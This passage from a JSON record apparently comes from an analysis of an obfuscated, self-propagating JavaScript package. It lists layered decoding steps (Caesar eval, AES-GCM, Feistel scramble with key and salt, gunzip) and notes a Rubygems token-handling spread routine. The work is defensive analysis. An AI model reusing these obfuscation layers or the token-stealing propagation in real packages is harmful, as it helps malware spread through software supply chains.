    "Rubygems self-propagation (handleRubygemsTokens) has its own darwin/linux test and token handling, found during repair and not encoded; a reviewer should decide whether it needs a gate like g6.",
    "guessed recipe fields",
    "out-of-set claim pending verification",
    "payload path not fully traced"
  ],
  "normalisation": {
    "derivations": [
      {
        "id": "d7",
        "recipe": "decode_spec",
        "recipe_version": 1,
        "input": {
          "file": "index.js",
          "derived_from": null
        },
        "params": {
          "decoder": "charcode_caesar_eval",
          "lang": "js"
        },
        "output_sha256": "f45b65301a4641ac"
      },
      {
        "id": "d8",
        "recipe": "decode_spec",
        "recipe_version": 1,
        "input": {
          "file": "index.js",
          "derived_from": "d7"
        },
        "params": {
          "fn": "_d",
          "var": "_b",
          "decoder": "aesgcm_hex_stage",
          "lang": "js"
        },
        "output_sha256": "ceff7c51d70832c3"
      },
      {
        "id": "d9",
        "recipe": "decode_spec",
        "recipe_version": 1,
        "input": {
          "file": "index.js",
          "derived_from": "d7"
        },
        "params": {
          "fn": "_d",
          "var": "_p",
          "decoder": "aesgcm_hex_stage",
          "lang": "js"
        },
        "output_sha256": "da39146ef451d1b1"
      },
      {
        "id": "d10",
        "recipe": "decode_spec",
        "recipe_version": 1,
        "input": {
          "file": "index.js",
          "derived_from": "d9"
        },
        "params": {
          "decoder": "obfio_objprop",
          "lang": "js"
        },
        "output_sha256": "9159022e77fb3e00"
      },
      {
        "id": "d11",
        "recipe": "decode_spec",
        "recipe_version": 1,
        "input": {
          "file": "index.js",
          "derived_from": "d10"
        },
        "params": {
          "fn": "f489094fb",
          "key": "77afe07fa1eca63ce025ef790b33cdcde73da475c5a700acb14a5578b35d2813",
          "salt": "74eb124111aadb515960c4618132c1b4",
          "decoder": "scramble_feistel",
          "lang": "js"
        },
        "output_sha256": "dbc6aa701d69aa44"
      },
      {
        "id": "d12",
        "recipe": "decode_spec",
        "recipe_version": 1,
        "input": {
          "file": "index.js",
          "derived_from": "d11"
        },
        "params": {
          "fn": "a",
          "decoder": "aesgcm_gunzip",
          "lang": "js"
        },
        "output_sha256": "960f64ccbccdfa95"
      }
    ],
    "candidate_set": {
      "generator": "gate_extract@432915badc",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 28,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 7,
    "out_of_set_ids": [
      "c1",
      "c2",
      "c3",
      "c4",
      "c5",
      "c6",
      "c7",
      "c8",
      "c9",
      "c10",
      "c11",
      "c12",
      "c13",
      "c14",
      "c15",
      "c16",
      "c17",
      "c18",
      "c19",
      "c20",
      "c21",
      "c22",
      "c23",
      "c24",
      "c25",
      "c26",
      "c27",
      "c28",
      "g1",
      "g2",
      "g3",
      "g4",
      "g5",
      "g6",
      "g7"
    ],
    "anchor_refusals": 0
  }
}
```
